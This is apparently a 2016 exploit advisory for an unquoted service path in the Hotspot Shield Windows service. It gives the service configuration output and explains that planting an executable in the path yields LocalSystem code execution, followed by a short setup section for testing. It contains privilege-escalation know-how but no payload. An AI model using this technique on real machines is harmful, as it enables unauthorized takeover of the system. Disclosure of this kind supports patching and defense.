#########################################################################
# Exploit Title: Hotspot Shield Unquoted Service Path Privilege Escalation
# Date: 13/10/2016
# Author: Amir.ght
# Vendor Homepage: https://www.hotspotshield.com
# Software Link: https://www.hotspotshield.com/download/
# version : 6.0.3  (Latest)
# Tested on: Windows 7
##########################################################################

Hotspot Shield installs as a service with an unquoted service path
To properly exploit this vulnerability,
the local attacker must insert an executable file in the path of the service.
Upon service restart or system reboot, the malicious code will be run
with elevated privileges.
-------------------------------------------
C:\>sc qc hshld
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: hshld
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Hotspot Shield\bin\cmw_srv.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Hotspot Shield Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem




Installation Instructions:
Download Hotspot Shield:
Use the provided link to download the Hotspot Shield installer.
Installation:
Run the installer and follow the on-screen instructions.
Install it in the default path: C:\Program Files\Hotspot Shield\bin\.
Configure Service:
Hotspot Shield installs as a service named hshld.
Ensure that the service is set to Auto-Start upon system boot.
Testing Setup:
Use the following command to confirm the service is running and check the unquoted service path:
sc qc hshld
Testing the Exploit:
Follow the steps mentioned in the Exploit Code document to test for the unquoted service path vulnerability.